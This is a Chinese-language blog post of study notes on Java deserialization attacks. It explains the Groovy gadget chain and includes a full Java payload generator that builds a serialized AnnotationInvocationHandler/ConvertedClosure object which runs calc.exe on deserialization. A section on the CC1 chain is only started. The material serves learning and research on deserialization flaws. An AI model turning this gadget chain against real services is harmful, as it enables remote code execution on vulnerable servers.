---
title: java反序列化漏洞1
date: 2022-12-20 00:55:40
tags:
---



# test



# java反序列化漏洞

## 0.java反序列化介绍

java反序列化的基本概念可以看大佬的博客,**Java反序列化の初见**：https://chenlvtang.top/2021/05/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E3%81%AE%E5%88%9D%E8%A7%81/

这里仅提几点注意事项。

- Serialized objects do not contain code, they contain only data
- The serialized object contains the class name of the serialized object
- Attackers control the data, but they do not contain the code, meaning that the attack depends on what the code does with the data

即，<font color=Red>反序列化攻击过程中我们所能控制的，只有服务器中所存在类的数据部分。</font> 我们反序列化所传输的仅仅是数据。我们不可能自己去定义创建一个新的类，也不可能修改已有类中的函数方法。只能够通过传递参数给已有类的构造函数等方式进行利用。



事实上，当你执行反序列化攻击时，你发送了一个对象的data。这意味着你完全依赖于接收方的行为，更具体地说，你依赖于此data反序列化时所采取的操作。<font color='00FF00'>这意味着如果对方不调用发送对象的任何方法，则不会执行远程代码。这就意味着你唯一的影响是设置你发送的对象的属性</font>。

现在这个概念很清楚，如果我们要实现代码执行，<font color='red'>我们发送的第一个类就应该有一个自动调用的方法</font>，这就解释了为什么第一个类是如此特别。



这个特殊的第一个类，以下我使用的是 <font color='red'>sun.reflect.annotation.AnnotationInvocationHandler</font>

------------



为什么要使用反射来创建类。我直接复制下百度的内容

Java的反射（reflection）机制是指<font color='red'>在程序的运行状态中，可以构造任意一个类的对象</font>，可以了解任意一个对象所属的类，可以了解任意一个类的成员变量和方法，可以调用任意一个对象的属性和方法。 这种动态获取程序信息以及动态调用对象的功能称为Java语言的反射机制。



-----------------------

还有一个点我觉得是概念性的问题，就随便这里提一下。比如shiro反序列化、fastjson反序列化什么的，那是工具代码中存在反序列化利用的漏洞。而我们常说的cc1链、cc2链什么带个链字的都叫利用链，是指存在反序列化利用漏洞后用来利用的方法。



## 1.groovy链

很喜欢p牛的一句话（没记错应该就是p牛说的）：你知道cc1有多复杂吗？.jpg

所以这里就先说个简单的groovy链来开始我们的利用链学习。

参考文章：https://paper.seebug.org/1171/



从最简单的场景开始

1.存在一处可控的反序列化

2.反序列化过程中自动执行对应类的readObject函数

3.sun.reflect.annotation.AnnotationInvocationHandler的构造方法能传入两个参数

![image-20230107161414061](E:\libarary\博客网站\hexo site\blog\source\_posts\test1.assets\image-20230107161414061.png)

sun.reflect.annotation.AnnotationInvocationHandler reobject函数

并且readObject方法调用了Map对象上的一个方法

![image-20230107161645754](E:\libarary\博客网站\hexo site\blog\source\_posts\test1.assets\image-20230107161645754.png)



综上1、2、3的过程，在反序列化的时候传入自己构造的map对象，那么就会执行map.entrySet()



Groovy

4.Groovy中的<font color='00FF00'>ConvertedClosure类</font>完成了接口InvocationHandler，能够作为我们动态代理的处理类。

5.ConvertedClosure接收两个参数，如下代码生成新的ConvertedClosure对象，能在执行<font color='00FF00'>closure.entrySet()</font>时候执行我们的命令ping 127.0.0.1

```java
final ConvertedClosure closure = new ConvertedClosure(new MethodClosure("ping 127.0.0.1", "execute"), "entrySet")
```

具体的调试过程参考文章：https://paper.seebug.org/1171/

debug内容很多。简单说，ConvertedClosure类的invoke函数里面实现了读取entrySet并未被定义，然后进入下图的if内，

![image-20230107221233757](E:\libarary\博客网站\hexo site\blog\source\_posts\test1.assets\image-20230107221233757.png)

然后对执行的方法进行对比，看是否是entrySet，两者相等继续进入if内

![image-20230107221408811](E:\libarary\博客网站\hexo site\blog\source\_posts\test1.assets\image-20230107221408811.png)

执行

((Closure) getDelegate()).call(args);

进入了Closure.call方法

![image-20230107221502385](E:\libarary\博客网站\hexo site\blog\source\_posts\test1.assets\image-20230107221502385.png)

继续进入，直到遇到命令执行的地方

![image-20230107221634342](E:\libarary\博客网站\hexo site\blog\source\_posts\test1.assets\image-20230107221634342.png)



综上4、5，我们能够构建出一个执行map对象，并且map对象的entrySet方法内容可以修改为执行我们自己的命令。







groovy反序列化代码

```java

//regular imports
import java.io.*;
import java.util.Map;

//reflection imports
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;

//library specific imports
import org.codehaus.groovy.runtime.ConvertedClosure;
import org.codehaus.groovy.runtime.MethodClosure;



public class ManualPayloadGenerate{
    public static void main(String[] args) throws IOException, ClassNotFoundException, InstantiationException, IllegalAccessException, InvocationTargetException {
        Object groovyExploit = getGroovyExploitObject();
//        serializeToByteArray(groovyExploit);

        //开始序列化
        FileOutputStream file = new FileOutputStream("chenlvtang.bin");
        ObjectOutputStream ser = new ObjectOutputStream(file);
        ser.writeObject(groovyExploit);
        ser.close();

        //反序列化
        FileInputStream file1 = new FileInputStream("chenlvtang.bin");
        ObjectInputStream unse = new ObjectInputStream(file1);
        Object serverRead = unse.readObject();
        unse.close();
        
    }

    public static void serializeToByteArray(Object object) throws IOException {
        PrintStream out = System.out;
        final ObjectOutputStream objOut = new ObjectOutputStream(out);
        objOut.writeObject(object);
    }

    public static Object getGroovyExploitObject() throws ClassNotFoundException, InstantiationException, IllegalAccessException, InvocationTargetException {
        final ConvertedClosure closure = new ConvertedClosure(new MethodClosure("calc.exe", "execute"), "entrySet");
        //here we proxy all calls to methods 
        final Map map = (Map) Proxy.newProxyInstance(ManualPayloadGenerate.class.getClassLoader(), new Class[] {Map.class}, closure);
        //this is the first class that will be deserialized
        String classToSerialize = "sun.reflect.annotation.AnnotationInvocationHandler";
        //access the constructor of the AnnotationInvocationHandler class
        final Constructor<?> constructor = Class.forName(classToSerialize).getDeclaredConstructors()[0];
        //normally the constructor is not accessible, so we need to make it accessible
        constructor.setAccessible(true);

        //this is were we set the initial chain for exploitation
        InvocationHandler secondInvocationHandler = (InvocationHandler) constructor.newInstance(Override.class, map);
        return secondInvocationHandler;
    }
}
```

![image-20230107171949704](E:\libarary\博客网站\hexo site\blog\source\_posts\test1.assets\image-20230107171949704.png)

（自己debug的时候还未到entrySet就直接弹出计算器，而且之后每一下步进F7都会弄出个计算器，不知道咋回事）



代码中唯一值得再说一下的应该是

```java
final Map map = (Map) Proxy.newProxyInstance(ManualPayloadGenerate.class.getClassLoader(), new Class[] {Map.class}, closure);
```

`Proxy.newProxyInstance`方法<font color='00FF00'>传递的第二个参数是代理类所要实现的接口</font>，里面只有一个Map.class所以<font color='00FF00'>生成的代理对象是实现了Map接口里所有方法</font>，所以才可以<font color='red'>将其强转成Map类型</font>并调用entrySet方法。

（因为我们传给AnnotationInvocationHandler的数据类型的map，所以我们需要利用这个ConvertedClosure实现了动态代理的接口的特点，将其强制转成Map数据类型）



### 小结

真要说groovy链的话，内容其实就后面那点，一句话就能说完：<font color='00FF00'>我们能输入方法名entrySet以及方法内容ping 127.0.0.1给ConvertedClosure类对象closure。</font> 至于前面的内容是为了实现在反序列化时自动执行我们定义的恶意代码所做的工作。





## 2.CC1

参考链接：

[Java反序列化之CC1其一](https://chenlvtang.top/2021/05/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC1%E5%85%B6%E4%B8%80/)

[Java反序列化之CC1其二](https://chenlvtang.top/2021/12/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC1%E5%85%B6%E4%BA%8C/)











































































